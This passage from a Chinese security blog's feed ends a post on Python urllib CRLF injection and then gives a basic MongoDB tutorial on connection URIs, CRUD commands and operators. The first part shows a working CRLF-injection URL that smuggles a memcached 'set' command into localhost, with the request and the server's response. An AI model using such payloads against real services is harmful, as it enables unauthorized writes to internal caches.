id="Memcached未授权"><a href="#Memcached未授权" class="headerlink" title="Memcached未授权"></a>Memcached未授权</h2><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1%0d%0aset%20foo%200%200%205%0d%0aABCDE%0d%0a:11211/foo</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>报文如下：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/foo</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">identity</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Python-urllib/3.4</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span>set foo 0 0 5ABCDE:11211<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当检查下面几行memcached的协议语法的时候，大部分都是语法错误，但是memcached在收到错误的命令的时候并不会关闭连接，这样攻击者就可以在请求的任何位置注入命令了，然后memcached就会执行</p><p>下面是响应：</p><pre class="line-numbers language-none"><code class="language-none">ERRORERRORERRORERRORERRORSTOREDERRORERROR<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93&quot;&gt;http://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="python" scheme="http://c1oudfl0w0.github.io/blog/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/05/09/MongoDB/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/05/09/MongoDB/</id>
    <published>2024-05-09T09:44:44.000Z</published>
    <updated>2024-05-11T03:49:14.135Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://www.runoob.com/mongodb/mongodb-tutorial.html">https://www.runoob.com/mongodb/mongodb-tutorial.html</a></p><p><a href="https://www.yuque.com/boogipop/ot88z5/zcq88ma6bgw6dmuw#vBsln">https://www.yuque.com/boogipop/ot88z5/zcq88ma6bgw6dmuw#vBsln</a></p><p>官方文档：<a href="https://www.mongodb.com/zh-cn/docs/manual/reference/">https://www.mongodb.com/zh-cn/docs/manual/reference/</a></p><span id="more"></span><hr><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>数据库安装：<a href="https://www.mongodb.com/try/download/community">https://www.mongodb.com/try/download/community</a></p><p>shell工具安装：<a href="https://www.mongodb.com/try/download/shell">https://www.mongodb.com/try/download/shell</a></p><hr><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><table><thead><tr><th>SQL 术语&#x2F;概念</th><th>MongoDB 术语&#x2F;概念</th><th>解释&#x2F;说明</th></tr></thead><tbody><tr><td>database</td><td>database</td><td>数据库</td></tr><tr><td>table</td><td>collection</td><td>数据库表&#x2F;集合</td></tr><tr><td>row</td><td>document</td><td>数据记录行&#x2F;文档</td></tr><tr><td>column</td><td>field</td><td>数据字段&#x2F;域</td></tr><tr><td>index</td><td>index</td><td>索引</td></tr><tr><td>table joins</td><td></td><td>表连接,MongoDB不支持</td></tr><tr><td>primary key</td><td>primary key</td><td>主键,MongoDB自动将_id字段设置为主键</td></tr></tbody></table><hr><h1 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h1><p>标准 URI 连接语法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mongodb://<span class="token punctuation">[</span>username:password@<span class="token punctuation">]</span>host1<span class="token punctuation">[</span>:port1<span class="token punctuation">]</span><span class="token punctuation">[</span>,host2<span class="token punctuation">[</span>:port2<span class="token punctuation">]</span>,<span class="token punctuation">..</span>.<span class="token punctuation">[</span>,hostN<span class="token punctuation">[</span>:portN<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>/<span class="token punctuation">[</span>database<span class="token punctuation">]</span><span class="token punctuation">[</span>?options<span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>此事在<a href="https://c1oudfl0w0.github.io/blog/2023/08/20/NoSQL%E6%B3%A8%E5%85%A5/#%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95">Nosql注入</a>中亦有记载…</p><h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><p>创建数据库：<code>use dbname</code>，假如存在就是切换到目标，不存在就新建</p><p>查看所有数据库：<code>show dbs</code></p><p>删除数据库：切换到目标数据库，然后<code>db.dropDatabase()</code>即可</p><h2 id="集合操作"><a href="#集合操作" class="headerlink" title="集合操作"></a>集合操作</h2><p>创建集合：<code>db.createCollection()</code>，db代表当前选中数据库</p><p>创建集合的时候可以初始化一些数据：<code>db.createCollection(&quot;mycol&quot;, &#123; capped : true, autoIndexId : true, size : 6142800, max : 10000 &#125;)</code></p><p>删除集合：<code>db.&lt;collectioname&gt;.drop</code></p><p>列出所有集合：<code>show collections/show tables</code></p><h2 id="增删查改"><a href="#增删查改" class="headerlink" title="增删查改"></a>增删查改</h2><p>增加数据：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span><span class="token operator">&lt;</span>collectionname<span class="token operator">></span><span class="token punctuation">.</span>insertOne<span class="token punctuation">(</span>&#123;<span class="token keyword">key</span>:<span class="token keyword">value</span><span class="token punctuation">,</span><span class="token keyword">key</span>:<span class="token keyword">value</span>&#125;<span class="token punctuation">)</span>db<span class="token punctuation">.</span><span class="token operator">&lt;</span>collectionname<span class="token operator">></span><span class="token punctuation">.</span><span class="token keyword">save</span><span class="token punctuation">(</span>&#123;<span class="token keyword">key</span>:<span class="token keyword">value</span><span class="token punctuation">,</span><span class="token keyword">key</span>:<span class="token keyword">value</span>&#125;<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>插入多条数据：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>users<span class="token punctuation">.</span>insertMany<span class="token punctuation">(</span><span class="token punctuation">[</span>  &#123; name: <span class="token string">"Alice"</span><span class="token punctuation">,</span> age: <span class="token number">25</span><span class="token punctuation">,</span> email: <span class="token string">"alice@example.com"</span> &#125;<span class="token punctuation">,</span>  &#123; name: <span class="token string">"Bob"</span><span class="token punctuation">,</span> age: <span class="token number">30</span><span class="token punctuation">,</span> email: <span class="token string">"bob@example.com"</span> &#125;<span class="token punctuation">,</span>  &#123; name: <span class="token string">"Charlie"</span><span class="token punctuation">,</span> age: <span class="token number">35</span><span class="token punctuation">,</span> email: <span class="token string">"charlie@example.com"</span> &#125;<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>删除语句：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">单条删除：db<span class="token punctuation">.</span>users<span class="token punctuation">.</span>deleteOne<span class="token punctuation">(</span>&#123; name: <span class="token string">"Alice"</span> &#125;<span class="token punctuation">)</span>多条删除：db<span class="token punctuation">.</span>users<span class="token punctuation">.</span>deleteMany<span class="token punctuation">(</span>&#123; age: &#123; $lt: <span class="token number">30</span> &#125; &#125;<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>修改数据：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">单条：db<span class="token punctuation">.</span>users<span class="token punctuation">.</span>updateOne<span class="token punctuation">(</span>&#123; name: <span class="token string">"Alice"</span> &#125;<span class="token punctuation">,</span> &#123; $<span class="token keyword">set</span>: &#123; age: <span class="token number">26</span> &#125; &#125;<span class="token punctuation">)</span>多条：db<span class="token punctuation">.</span>users<span class="token punctuation">.</span>updateMany<span class="token punctuation">(</span>&#123; age: &#123; $lt: <span class="token number">30</span> &#125; &#125;<span class="token punctuation">,</span> &#123; $<span class="token keyword">set</span>: &#123; <span class="token keyword">status</span>: <span class="token string">"active"</span> &#125; &#125;<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>例如，要替换users集合中name字段为Bob的第一个文档，可以使用：（后面是修改的数据）</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>users<span class="token punctuation">.</span>replaceOne<span class="token punctuation">(</span>&#123; name: <span class="token string">"Bob"</span> &#125;<span class="token punctuation">,</span> &#123; name: <span class="token string">"Bob"</span><span class="token punctuation">,</span> age: <span class="token number">31</span><span class="token punctuation">,</span> email: <span class="token string">"bob@example.com"</span> &#125;<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询语句：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span><span class="token operator">&lt;</span>collectionname<span class="token operator">></span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 查询所有</span>db<span class="token punctuation">.</span>users<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123; name: <span class="token string">"Alice"</span> &#125;<span class="token punctuation">,</span> &#123; name: <span class="token number">1</span><span class="token punctuation">,</span> age: <span class="token number">1</span> &#125;<span class="token punctuation">)</span><span class="token comment"># 条件查询往里面加语句</span>db<span class="token punctuation">.</span>users<span class="token punctuation">.</span>findOne<span class="token punctuation">(</span>&#123; name: <span class="token string">"Alice"</span> &#125;<span class="token punctuation">)</span><span class="token comment"># 限制单条条件查询，只返回一个数据</span>db<span class="token punctuation">.</span>users<span class="token punctuation">.</span>findOne<span class="token punctuation">(</span>&#123; name: <span class="token string">"Alice"</span> &#125;<span class="token punctuation">,</span> &#123; name: <span class="token number">1</span><span class="token punctuation">,</span> age: <span class="token number">1</span> &#125;<span class="token punctuation">)</span><span class="token comment"># 使用name和age字段指定了一个投影，该投影将仅返回具有name和age字段的文档</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="条件操作符"><a href="#条件操作符" class="headerlink" title="条件操作符"></a>条件操作符</h2><h3 id="查询和投影操作符"><a href="#查询和投影操作符" class="headerlink" title="查询和投影操作符"></a>查询和投影操作符</h3><p>比较查询</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$eq$gt$gte$<span class="token operator">in</span>$lt$lte$ne$nin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逻辑查询</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token operator">and</span>$<span class="token operator">not</span>$nor$<span class="token operator">or</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>元素查询</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">exists</span>$<span class="token keyword">type</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>评估查询</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$expr$jsonSchema$mod$regex$<span class="token keyword">text</span>$<span class="token keyword">where</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数组查询</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">all</span>$elemMatch$size<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>按位查询</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$bitsAllClear$bitsAllet$bitsAnyClear$bitsAnySet<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>投影操作</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$$elemMatch$slice<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其他</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">comment</span>$rand$<span class="token keyword">natural</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="更新操作符"><a href="#更新操作符" class="headerlink" title="更新操作符"></a>更新操作符</h3><p>字段更新</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$currentDate$inc$min$max$mul$<span class="token keyword">rename</span>$<span class="token keyword">set</span>$setOnInsert$unset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数组更新</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$$<span class="token punctuation">[</span><span class="token punctuation">]</span>$<span class="token punctuation">[</span><span class="token operator">&lt;</span>identifier<span class="token operator">></span><span class="token punctuation">]</span>$addToSet$pop$pull$push$pullAll$each$position$slice$sort<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按位更新</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">bit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="聚合操作符"><a href="#聚合操作符" class="headerlink" title="聚合操作符"></a>聚合操作符</h2><p>这个太多了，直接看文档吧：<a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation">https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation</a></p><h2 id="字符串表达式"><a href="#字符串表达式" class="headerlink" title="字符串表达式"></a>字符串表达式</h2><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/concat/#mongodb-expression-exp.-concat"><code>$concat</code></a></td><td>连接任意数量的字符串。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/dateFromString/#mongodb-expression-exp.-dateFromString"><code>$dateFromString</code></a></td><td>将日期&#x2F;时间字符串转换为日期对象。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/dateToString/#mongodb-expression-exp.-dateToString"><code>$dateToString</code></a></td><td>以格式化字符串的形式返回日期。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/indexOfBytes/#mongodb-expression-exp.-indexOfBytes"><code>$indexOfBytes</code></a></td><td>搜索字符串中出现的子字符串，并返回首次出现的 UTF-8 字节索引。如果未找到该子字符串，则返回 <code>-1</code>。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/indexOfCP/#mongodb-expression-exp.-indexOfCP"><code>$indexOfCP</code></a></td><td>在字符串中搜索子字符串的出现位置，并返回第一次出现时的 UTF-8 码位索引。如果未找到子字符串，则返回 <code>-1</code></td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/ltrim/#mongodb-expression-exp.-ltrim"><code>$ltrim</code></a></td><td>删除字符串开头和结尾的空白或指定字符。<em>版本 4.0 中的新增功能</em>.</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/regexFind/#mongodb-expression-exp.-regexFind"><code>$regexFind</code></a></td><td>将正则表达式应用于字符串，并返回<em>第一个</em>匹配子字符串的信息。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/regexFindAll/#mongodb-expression-exp.-regexFindAll"><code>$regexFindAll</code></a></td><td>将正则表达式 (regex) 应用于字符串，并返回有关所有匹配子字符串的信息。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/regexMatch/#mongodb-expression-exp.-regexMatch"><code>$regexMatch</code></a></td><td>将正则表达式 (regex) 应用于字符串并返回一个布尔值，它可表示是否已找到匹配项。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/replaceOne/#mongodb-expression-exp.-replaceOne"><code>$replaceOne</code></a></td><td>替换给定输入中匹配字符串的第一个实例。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/replaceAll/#mongodb-expression-exp.-replaceAll"><code>$replaceAll</code></a></td><td>替换给定输入中匹配字符串的所有实例。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/rtrim/#mongodb-expression-exp.-rtrim"><code>$rtrim</code></a></td><td>删除字符串结尾的空白或指定字符。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/split/#mongodb-expression-exp.-split"><code>$split</code></a></td><td>根据分隔符将字符串拆分为子字符串。返回子字符串数组。如果在字符串中找不到分隔符，则返回包含原始字符串的数组。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/strLenBytes/#mongodb-expression-exp.-strLenBytes"><code>$strLenBytes</code></a></td><td>返回字符串中 UTF-8 编码的字节数。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/strLenCP/#mongodb-expression-exp.-strLenCP"><code>$strLenCP</code></a></td><td>返回 UTF-8<a href="http://www.unicode.org/glossary/#code_point"> 代码点数</a></td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/strcasecmp/#mongodb-expression-exp.-strcasecmp"><code>$strcasecmp</code></a></td><td>执行不区分大小写的字符串比较并返回：如果两个字符串相等，则返回 <code>0</code>；如果第一个字符串大于第二个字符串，则返回 <code>1</code>；如果第一个字符串小于第二个字符串，则返回 <code>-1</code>。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/substr/#mongodb-expression-exp.-substr"><code>$substr</code></a></td><td>已弃用。使用<a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/substrBytes/#mongodb-expression-exp.-substrBytes"><code>$substrBytes</code></a> 或 <a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/substrCP/#mongodb-expression-exp.-substrCP"><code>$substrCP</code></a></td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/substrBytes/#mongodb-expression-exp.-substrBytes"><code>$substrBytes</code></a></td><td>返回字符串的子串。从字符串中指定的 UTF-8 字节索引（从零开始）处的字符开始，持续指定的字节数。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/substrCP/#mongodb-expression-exp.-substrCP"><code>$substrCP</code></a></td><td>返回字符串的子字符串。从指定的 UTF-8<a href="http://www.unicode.org/glossary/#code_point"> 代码点 (CP)</a></td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/toLower/#mongodb-expression-exp.-toLower"><code>$toLower</code></a></td><td>将字符串转换为小写。接受单个参数表达式。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/toString/#mongodb-expression-exp.-toString"><code>$toString</code></a></td><td>将值转换为字符串。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/trim/#mongodb-expression-exp.-trim"><code>$trim</code></a></td><td>删除字符串开头和结尾的空白或指定字符。</td></tr><tr><td><a href="https://www.mongodb.com/zh-cn/docs/manual/reference/operator/aggregation/toUpper/#mongodb-expression-exp.-toUpper"><code>$toUpper</code></a></td><td>将字符串转换为大写。接受单个参数表达式。</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.runoob.com/mongodb/mongodb-tutorial.html&quot;&gt;https://www.runoob.com/mongodb/mongodb-tutorial.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/boogipop/ot88z5/zcq88ma6bgw6dmuw#vBsln&quot;&gt;https://www.yuque.com/boogipop/ot88z5/zcq88ma6bgw6dmuw#vBsln&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;官方文档：&lt;a href=&quot;https://www.mongodb.com/zh-cn/docs/manual/reference/&quot;&gt;https://www.mongodb.com/zh-cn/docs/manual/reference/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Basic" scheme="http://c1oudfl0w0.github.io/blog/categories/Basic/"/>
    
    
    <category term="Sql" scheme="http://c1oudfl0w0.github.io/blog/tags/Sql/"/>
    
  </entry>
  
</feed>
